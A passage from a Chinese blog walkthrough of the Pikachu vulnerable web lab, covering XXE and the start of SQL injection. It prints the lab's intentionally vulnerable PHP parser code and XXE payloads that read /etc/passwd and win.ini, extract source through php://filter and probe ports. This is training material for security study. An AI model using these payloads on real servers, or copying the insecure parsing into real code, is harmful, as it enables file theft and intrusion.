<p>② 外部引用DTD格式<!DOCTYPE 根元素 SYSTEM "外部DTD的URI"></p>
<p>③ 引用公共DTD格式<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI"></p>
<ul>
<li>本地实体类型举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;  encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [           &#x2F;&#x2F;定义了foo的根元素</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;        &#x2F;&#x2F;foo是接受任何参数的</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;    &#x2F;&#x2F;定义了一个实体 xxe，内容为test</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;    &#x2F;&#x2F;&amp;xxe进行引用 本地引用</span><br><span class="line">	&lt;pass&gt;pass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>外部实体引用举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>

<p>查看后端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">    <span class="comment">//$xml = $test;</span></span><br><span class="line">    <span class="comment">//考虑到目前很多版本里Libxml都&gt;=2.9.0,所以此处添加LIBXML_NOENT参数开启外部实体解析</span></span><br><span class="line">    <span class="variable">$data</span> = @simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//正常xml数据测试,此处的回显并不能证明支持外部实体，需要进一步测试</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">&quot;swanQ&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//服务器为windows系统，用此payload来测试是否有xxe漏洞。</span><br><span class="line">//查看服务器的内容</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C://Windows//win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//用php://filter获取php源代码</span><br><span class="line">//使用php伪协议，打印base64编码后的xxe.php</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//爆破开放端口</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">noet</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//Linux下读取文件</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常xml数据测试:</p>
<p><img src="8.png"></p>
<p>查看服务器的内容:</p>
<p><img src="9.png"></p>
<p>使用php伪协议，打印base64编码后的xxe.php.解码即可看到相应内容。</p>
<p><img src="10.png"></p>
<p><img src="11.png"></p>
<blockquote>
<p>php伪协议：</p>
<p>PHP 带有很多内置 URL 风格的封装协议，支持 <code>scheme://...</code> 的语法</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
</ul>
<p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
</blockquote>
<p>爆破开放端口时，并无多余提示，但是处理速度不同，解析81端口时，速度明显慢于80端口。</p>
<p>看请求包和回应包的时间间隔来判断是否开放：</p>
<p><img src="12.png"></p>
<p><img src="15.jpg"></p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。<br>从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
<p>一般会从以下方面来防止SQL注入漏洞：</p>
<ol>
<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
<li>使用参数化（Parameterized Query 或 Parameterized Statement）；</li>
<li>目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需慎重</li>
</ol>
<h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>数字型注入，直接在包后面加上真命题，返回所有的数据库数据</p>
<p><img src="14.jpg"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1></script></li></ul>
    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>swanQ
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://swanq.top/2021/04/28/pikachu/" title="pikachu靶场通关指南(一)">http://swanq.top/2021/04/28/pikachu/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

	  <div>
      
       <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">你想在文章末尾对读者说的话</div>
    
</div>
      
      </div>
      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
              <a href="/tags/CSRF/" rel="tag"><i class="fa fa-tag"></i> CSRF</a>
              <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
              <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql injection</a>
              <a href="/tags/Brute-Force/" rel="tag"><i class="fa fa-tag"></i> Brute Force</a>
              <a href="/tags/file-uploads/" rel="tag"><i class="fa fa-tag"></i> file uploads</a>
              <a href="/tags/over-permission/" rel="tag"><i class="fa fa-tag"></i> over permission</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/04/22/Broken-Access-Contro/" rel="prev" title="越权访问BAC-Broken Access Contro">
      <i class="fa fa-chevron-left"></i> 越权访问BAC-Broken Access Contro
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/" rel="next" title="方滨兴院士讲座有感">
      方滨兴院士讲座有感 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burt-Force"><span class="nav-number">2.</span> <span class="nav-text">Burt Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%EF%BC%9A"><span class="nav-number">2.0.1.</span> <span class="nav-text">相关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%8F%E9%AA%8C%EF%BC%9A"><span class="nav-number">2.0.2.</span> <span class="nav-text">经验：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%B5%81%E7%A8%8B"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">暴力破解流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E9%AB%98%E6%95%88%E5%AD%97%E5%85%B8"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">生成高效字典</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E5%85%B8%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7"><span class="nav-number">2.0.2.3.</span> <span class="nav-text">字典优化技巧</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.1.</span> <span class="nav-text">验证码绕过(on server)服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.2.</span> <span class="nav-text">验证码绕过(on client)服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Token%E9%98%B2%E7%88%86%E7%A0%B4"><span class="nav-number">2.3.</span> <span class="nav-text">Token防爆破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-number">3.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-get"><span class="nav-number">3.1.</span> <span class="nav-text">反射型XSS(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-post"><span class="nav-number">3.2.</span> <span class="nav-text">反射型XSS(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">3.3.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8BXSS"><span class="nav-number">3.4.</span> <span class="nav-text">DOM型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8BXSS-X"><span class="nav-number">3.5.</span> <span class="nav-text">DOM型XSS-X</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-number">3.6.</span> <span class="nav-text">XSS之盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">3.7.</span> <span class="nav-text">XSS之过滤</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="swanQ"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">让自己去触碰安全的blue sky</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">58</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    聊天
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">83k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:15</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
<script type="text/javascript" src="/js/src/clicklove.js"></script>
</html>
